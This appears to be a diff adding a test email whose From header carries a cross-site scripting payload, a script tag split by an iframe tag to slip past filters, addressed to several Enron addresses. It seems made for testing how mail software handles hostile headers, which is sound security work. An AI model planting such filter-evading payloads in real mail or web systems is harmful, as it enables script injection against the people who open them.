@@ -1,0 +1,7 @@
+From: <"test<script defer="defer">alert(/xss by cc/);</sc<iframe>ript>@attack.com">
+To: mark.haedicke@enron.com, sheila.tweed@enron.com, michelle.cash@enron.com, 
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
